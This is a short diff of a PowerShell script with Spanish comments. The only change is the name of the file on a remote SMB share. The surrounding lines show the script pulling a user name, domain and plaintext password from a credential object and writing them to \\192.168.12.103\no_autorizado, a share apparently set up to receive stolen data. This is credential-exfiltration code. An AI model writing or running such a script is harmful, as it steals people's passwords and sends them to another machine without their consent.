@@ -19,7 +19,7 @@ $smbPassword = "noaut1"
 $output = $cred.GetNetworkCredential() | Select-Object UserName, Domain, Password
 
 # Especifica la ruta del recurso compartido SMB
-$smbPath = "\\192.168.12.103\no_autorizado\noc.txt"
+$smbPath = "\\192.168.12.103\no_autorizado\datos.txt"
 
 # Copiar la salida al servidor SMB
 $output | Out-File -FilePath $smbPath
